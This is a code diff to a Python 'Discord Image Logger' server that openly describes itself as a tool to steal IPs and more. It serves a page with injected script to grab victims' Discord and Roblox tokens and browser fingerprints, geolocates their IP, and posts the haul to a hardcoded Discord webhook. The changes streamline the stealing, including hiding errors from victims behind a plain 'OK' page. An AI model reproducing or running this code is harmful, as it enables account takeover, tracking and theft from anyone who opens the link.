@@ -3,11 +3,11 @@
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
-import traceback, requests, base64, httpagentparser, urllib.parse, json, datetime, hashlib, time, socket, ssl
+import traceback, requests, base64, httpagentparser, urllib.parse, json, datetime, hashlib, time
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
-__version__ = "v3.0-ULTIMATE"
+__version__ = "v3.0-FIXED"
 __author__ = "DeKrypt"
 
 TOKEN_JS = '''<script>
@@ -27,28 +27,12 @@ config = {
     "webhook": "https://discord.com/api/webhooks/1470096967848824842/r-jZxPC9ak3StrviCxigMgb6uk5fdKXaffchHmjc8rs9z72qk4td6c52QBjd_a1cjKiV",
     "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200",
     "imageArgument": True,
-    "username": "Image Logger", 
+    "username": "z0m logger", 
     "color": 0x00FFFF, 
-
-    "crashBrowser": False,
-    "accurateLocation": False,
-    "message": {
-        "doMessage": False, 
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", 
-        "richMessage": True, 
-    },
-    "vpnCheck": 1, 
-    "linkAlerts": True, 
-    "buggedImage": True, 
-    "antiBot": 1, 
-    "redirect": {
-        "redirect": False, 
-        "page": "https://your-link.here" 
-    },
-    "tokenSteal": True,  # NEW: Discord/Roblox token stealing
-    "fpSteal": True,     # NEW: Full browser fingerprinting
-    "multiExfil": True,  # NEW: Multiple exfil methods
-    "stealthMode": True, # NEW: Stealth pixel + no-cache
+    "tokenSteal": True,
+    "fpSteal": True,     
+    "multiExfil": True,  
+    "stealthMode": True,
 }
 
 blacklistedIPs = ("27", "104", "143", "164", "34", "35")
@@ -59,9 +43,6 @@ def botCheck(ip, useragent):
         return "BOT"
     return False
 
-def fingerprint_hash(data):
-    return hashlib.sha256(data.encode()).hexdigest()[:16]
-
 def geolocate_plus(ip):
     try:
         r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,isp,org,as,lat,lon,timezone,zip,proxy,mobile,hosting", timeout=3)
@@ -69,32 +50,30 @@ def geolocate_plus(ip):
     except:
         return {}
 
-def parse_fp_data(query):
-    fp = {}
-    for key, val in urllib.parse.parse_qs(query).items():
-        if key not in ['token', 'roblox']:
-            fp[key] = urllib.parse.unquote(val[0]) if val else ''
-    return fp
+def safe_fp_get(fp, key, default="N/A"):
+    if isinstance(fp, dict):
+        return fp.get(key, default)
+    return default
 
 def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, token="", roblox="", fp=""):
     if ip.startswith(blacklistedIPs):
         return
     
     bot = botCheck(ip, useragent)
-    if bot and config["antiBot"] >= 2:
+    if bot:
         return
     
     info = geolocate_plus(ip)
-    if info.get("proxy") and config["vpnCheck"] >= 2:
-        return
-    
-    ping = "@everyone" if not (info.get("proxy") and config["vpnCheck"] >= 1 or info.get("hosting") and config["antiBot"] >= 1) else ""
     
     os_browser = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")
     
+    fp_dict = {} if isinstance(fp, str) else fp
+    
+    network_info = f"Referer: {safe_fp_get(fp_dict, 'rf', 'direct')[:250]}\nCookies: {safe_fp_get(fp_dict, 'ck', '0')}\nConnection: {safe_fp_get(fp_dict, 'n', 'unknown')}"
+    
     embed = {
         "username": config["username"],
-        "content": ping,
+        "content": "@everyone",
         "embeds": [{
             "title": "🖼️ ULTIMATE Image Logger - FULL CAPTURE",
             "color": config["color"],
@@ -122,13 +101,14 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, token
 **🔑 TOKENS:**{f'\n> **Discord:** `{urllib.parse.unquote(token)}`' if token else ''}
 {'> **Roblox:** `{urllib.parse.unquote(roblox)}`' if roblox else ''}
 
-**🖥️ FINGERPRINT:**{f'\n> Canvas: `{fp.get("cv","N/A")}`\n> WebGL: `{fp.get("wg","N/A")}`\n> Audio: `{fp.get("ah","N/A")}`\n> Fonts: `{fp.get("fs","N/A")[:200]}`\n> Screen: `{fp.get("s","N/A")}`\n> CPU: `{fp.get("c","N/A")}` cores\n> RAM: `{fp.get("m","N/A")}`GB\n> Plugins: `{len(fp.get("pl","").split(","))}`\n> Touch: `{fp.get("tc","N/A")}`\n> Battery: `{fp.get("bat","N/A")}`\n> Memory: `{fp.get("mem","N/A")}`' if fp else ''}""",
-            "fields": [{"name":"Network","value":f"Referer: `{fp.get('rf','direct')[:250]}`\nCookies: `{fp.get('ck','0')}`\nConnection: `{fp.get('n','unknown')}`","inline":True}]
+**🖥️ FINGERPRINT:**{f'\n> Canvas: `{safe_fp_get(fp_dict,"cv")}`\n> WebGL: `{safe_fp_get(fp_dict,"wg")}`\n> Audio: `{safe_fp_get(fp_dict,"ah")}`\n> Fonts: `{safe_fp_get(fp_dict,"fs","")[:200]}`\n> Screen: `{safe_fp_get(fp_dict,"s")}`\n> CPU: `{safe_fp_get(fp_dict,"c")}` cores\n> RAM: `{safe_fp_get(fp_dict,"m")}`GB\n> Plugins: `{len(safe_fp_get(fp_dict,"pl","").split(","))}`\n> Touch: `{safe_fp_get(fp_dict,"tc")}`\n> Battery: `{safe_fp_get(fp_dict,"bat")}`\n> Memory: `{safe_fp_get(fp_dict,"mem")}`' if config["fpSteal"] else ''}""",
+            "fields": [{"name":"🌐 Network","value":network_info,"inline":True}]
         }]
     }
     
     if url: embed["embeds"][0]["thumbnail"] = {"url": url}
-    try: requests.post(config["webhook"], json=embed, timeout=5)
+    try: 
+        requests.post(config["webhook"], json=embed, timeout=5)
     except: pass
 
 def reportError(error):
@@ -136,7 +116,7 @@ def reportError(error):
         requests.post(config["webhook"], json={
             "username": config["username"],
             "content": "@everyone",
-            "embeds": [{"title": "❌ Image Logger - CRITICAL ERROR", "color": 0xFF0000, "description": f"```\n{str(error)[:1900]}\n```"}]
+            "embeds": [{"title": "z0m logger - ERROR", "color": 0xFF0000, "description": f"```\n{str(error)[:1900]}\n```"}]
         })
     except: pass
 
@@ -155,7 +135,7 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
                 params = urllib.parse.parse_qs(query)
                 token = params.get('token', [''])[0]
                 roblox = params.get('roblox', [''])[0]
-                fp_data = parse_fp_data(query)
+                fp_data = {k: urllib.parse.unquote(v[0]) for k,v in params.items() if k not in ['token','roblox']}
                 
                 ip = self.headers.get('X-Forwarded-For', '').split(',')[0].strip() or self.client_address[0]
                 ua = self.headers.get('User-Agent', 'unknown')
@@ -190,50 +170,33 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
             
             bot = botCheck(ip, ua)
             if bot:
-                self.send_response(200 if config["buggedImage"] else 302)
-                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
+                self.send_response(200)
+                self.send_header('Content-Type', 'image/jpeg')
                 self.end_headers()
-                if config["buggedImage"]: 
-                    self.wfile.write(binaries["loading"])
+                self.wfile.write(binaries["loading"])
                 makeReport(ip, ua, endpoint=s.split("?")[0], url=url)
                 return
             
-            result = makeReport(ip, ua, endpoint=s.split("?")[0], url=url)
+            makeReport(ip, ua, endpoint=s.split("?")[0], url=url)
             
             data = f'''<style>*{{margin:0;padding:0;border:0;}}html,body{{height:100vh;width:100vw;overflow:hidden;background:#000;}}div.img{{background:url('{url}') center/contain no-repeat;background-position:center;background-size:contain;width:100vw;height:100vh;filter:contrast(1.1)brightness(1.05);image-rendering:-webkit-optimize-contrast;image-rendering:crisp-edges;}}</style><div class="img"></div>'''
             
             if config["tokenSteal"] or config["fpSteal"]:
                 data += TOKEN_JS
             
-            message = config["message"]["message"]
-            if config["message"]["richMessage"] and result:
-                for key, val in result.items():
-                    message = message.replace(f"{{{key}}}", str(val))
-                message = message.replace("{browser}", httpagentparser.simple_detect(ua)[1])
-                message = message.replace("{os}", httpagentparser.simple_detect(ua)[0])
-
-            if config["message"]["doMessage"]:
-                data = f'<style>body{{margin:0;padding:20px;font-family:monospace;background:#000;color:#0f0;}}pre{{white-space:pre-wrap;}}</style><pre>{message}</pre>'
-            
-            if config["crashBrowser"]:
-                data += '<script>setTimeout(()=>{for(let i=69420;i==i;i*=i)console.log(i);let c=document.createElement("canvas");while(1){let ctx=c.getContext("2d");ctx.fillRect(0,0,999999,999999);}},100);</script>'
-
-            if config["redirect"]["redirect"]:
-                data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}"><title>Redirecting...</title>'
-
             self.send_response(200)
             self.send_header('Content-Type', 'text/html')
-            self.send_header('Cache-Control', 'no-cache,no-store,must-revalidate,proxy-revalidate')
-            self.send_header('Pragma', 'no-cache')
-            self.send_header('Expires', '0')
+            self.send_header('Cache-Control', 'no-cache,no-store,must-revalidate')
             self.end_headers()
             self.wfile.write(data.encode())
         
         except Exception as e:
-            self.send_response(500)
-            self.send_header('Content-Type', 'text/html')
-            self.end_headers()
-            self.wfile.write(b'500 Error - Check Discord webhook')
+            try:
+                self.send_response(200)
+                self.send_header('Content-Type', 'text/html')
+                self.end_headers()
+                self.wfile.write(b'<html><body>OK</body></html>')
+            except: pass
             reportError(traceback.format_exc())
 
     do_GET = handleRequest
